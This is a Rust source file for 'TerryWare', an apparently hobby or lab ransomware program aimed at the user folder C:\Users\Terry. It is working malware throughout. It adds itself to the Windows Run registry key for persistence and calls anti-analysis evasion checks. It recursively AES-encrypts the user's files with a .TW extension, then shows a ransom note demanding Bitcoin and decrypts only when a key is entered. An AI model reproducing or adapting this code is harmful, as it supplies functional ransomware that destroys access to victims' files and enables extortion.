use std::path::Path;
use std::process::exit;
use std::io;
use std::env;
use std::fs;
use winreg::enums::*;
use winreg::RegKey;
use sha2::{Sha256, Digest};
use rand::Rng;
use libaes::Cipher; 
mod evasion;
use crate::evasion::run_evasion_checks;
use crate::evasion::EvasionCheck;
use colored::*;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::winnt::PAGE_READWRITE;
use winapi::um::winnt::MEM_COMMIT;
use winapi::um::winnt::MEM_RESERVE;
// We'll come back to these :)
//mod anti_av;
//use crate::anti_av::{initialize_anti_av, AntiAV};

fn main() {
    println!("{} Starting TerryWare...", "[+]".green());
    
    let test_pattern1 = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        )
    };

    let test_pattern2 = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        )
    };
    
    if !test_pattern1.is_null() {
        let pattern1 = b"DEBUG_WATERMARK_1234";
        unsafe {
            std::ptr::copy_nonoverlapping(
                pattern1.as_ptr(),
                test_pattern1.cast(),
                pattern1.len()
            );
        }
        println!("{} Created first debug pattern at: 0x{:X}", "[+]".yellow(), test_pattern1 as usize);
    }

    if !test_pattern2.is_null() {
        let pattern2 = b"ANALYSIS_PATTERN_5678";
        unsafe {
            std::ptr::copy_nonoverlapping(
                pattern2.as_ptr(),
                test_pattern2.cast(),
                pattern2.len()
            );
        }
        println!("{} Created second debug pattern at: 0x{:X}", "[+]".yellow(), test_pattern2 as usize);
    }

    // Run the checks
    if !run_evasion_checks() {
        println!("{} WARNING: Suspicious environment detected.", "[!]".yellow());
    }
    
    let monitor = EvasionCheck::start_monitoring();
    
    let result = if !Path::new("C:\\Users\\Terry").exists() {
        println!("{} Error: User 'Terry' not found.\n    Exiting...", "[!]".red());
        exit(1);
    } else {
        match persistence() {
            Ok(0) => {
                println!("Persistence established.");
                Ok(Box::new(encrypt) as Box<dyn Fn()>)
            },
            Ok(1) => Ok(Box::new(message) as Box<dyn Fn()>),
            Err(e) => {
                eprintln!("Failed to set up persistence: {}", e);
                Err("Persistence failed")
            },
            _ => Err("Unknown error"),
        }
    };

    let monitoring_stopped = EvasionCheck::stop_monitoring(monitor);
    
    if !monitoring_stopped {
        exit(1);
    }

    match result {
        Ok(f) => f(),
        Err(_) => {
            let mut input = String::new();
            io::stdin().read_line(&mut input).unwrap();
            exit(1);
        }
    }
}

fn persistence() -> Result<i32, Box<dyn std::error::Error>> {
    let exe_path = env::current_exe()?;
    let exe_path_str = exe_path.to_str().ok_or("Invalid executable path")?;
    
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let key = hkcu.open_subkey_with_flags(
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        KEY_ALL_ACCESS,
    )?;

    let exists = match key.get_value::<String, _>("TerryWare") {
        Ok(_) => true,
        Err(_) => false,
    };

    if exists {
        Ok(1)
    } else {
        key.set_value("TerryWare", &exe_path_str)?;
        Ok(0)
    }
}


fn encrypt() {
    let aes_key = generate_aes_key();
    let terry_dir = Path::new(r"C:\Users\Terry");
    let cipher = Cipher::new_128(&aes_key);

    println!("Encrypting...");
    encrypt_recursive(terry_dir, &cipher);
    println!("Encryption complete.");
    
    message();
}

fn encrypt_recursive(dir: &Path, cipher: &Cipher) {
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries {
            if let Ok(entry) = entry {
                let path = entry.path();
                if path.is_dir() {
                    encrypt_recursive(&path, cipher);
                } else if path.is_file() {
                    let file_name = path.to_str().unwrap();
                    if let Ok(file_content) = fs::read(file_name) {
                        let iv: [u8; 16] = rand::rng().random();
                        let encrypted = cipher.cbc_encrypt(&iv, &file_content);
                        let mut final_content = Vec::with_capacity(iv.len() + encrypted.len());
                        final_content.extend_from_slice(&iv);
                        final_content.extend_from_slice(&encrypted);
                        if fs::write(file_name, final_content).is_ok() {
                            let new_filename = format!("{}.TW", file_name);
                            let _ = fs::rename(file_name, new_filename).is_ok();
                        }
                    }
                }
            }
        }
    }
}

fn decrypt() {
    let aes_key = generate_aes_key();
    let terry_dir = Path::new(r"C:\Users\Terry");
    let cipher = Cipher::new_128(&aes_key);

    println!("Decrypting...");
    decrypt_recursive(terry_dir, &cipher);
    println!("Decryption complete.");

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
    match hkcu.open_subkey_with_flags(path, KEY_ALL_ACCESS) {
        Ok(key) => {
            match key.delete_value("TerryWare") {
                Ok(_) => (),
                Err(e) => eprintln!("Failed to delete registry value: {}", e),
            }
        },
        Err(e) => eprintln!("Failed to open registry key: {}", e),
    }
}

fn decrypt_recursive(dir: &Path, cipher: &Cipher) {
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries {
            if let Ok(entry) = entry {
                let path = entry.path();
                if path.is_dir() {
                    decrypt_recursive(&path, cipher);
                } else if path.is_file() {
                    if let Some(file_name) = path.to_str() {
                        if file_name.ends_with(".TW") {
                            if let Ok(file_content) = fs::read(file_name) {
                                if file_content.len() > 16 {
                                    let iv = &file_content[..16];
                                    let encrypted_content = &file_content[16..];
                                    let decrypted = cipher.cbc_decrypt(iv, encrypted_content);
                                    let new_filename = file_name.replace(".TW", "");
                                    if fs::write(&new_filename, decrypted).is_ok() {
                                        let _ = fs::remove_file(file_name).is_ok();
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

fn generate_aes_key() -> [u8; 16] {
    let dictionary = ["t", "e", "r", "r", "y", "p", "a", "s", "s"];
    let password = dictionary.join("");
    let mut hasher = Sha256::new();
    hasher.update(password.as_bytes());
    let result = hasher.finalize();
    let mut key = [0u8; 16];
    key.copy_from_slice(&result[..16]);
    key
}

fn message() {
    let ransom_note = r#"
    You have been ransomed by TerryWare! Sorry Terry!
    Please send $1,000 USD to this BTC address: 12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw
    After payment, please submit proof to http://iloveransomware.org/submit
    After confirmation of payment, please input the provided decryption key"#;
    println!("{}\n", ransom_note);
    let mut keyattempt = String::new();
    let aes_key = generate_aes_key();
    let correct_key_string = format!("{:x}", aes_key.iter().fold(0u128, |acc, &b| (acc << 8) | b as u128));
    loop {
        println!("--------------------------\nDecryption key:");
        std::io::stdin().read_line(&mut keyattempt).expect("Failed to read line");
        keyattempt = keyattempt.trim().to_string();

        if keyattempt == correct_key_string {
            println!("\nCorrect key entered. Decryption process will begin.\nThank you for your payment.\n");
            break;
        } else {
            println!("Incorrect key.");
            keyattempt.clear();
        }
    }
    decrypt();
}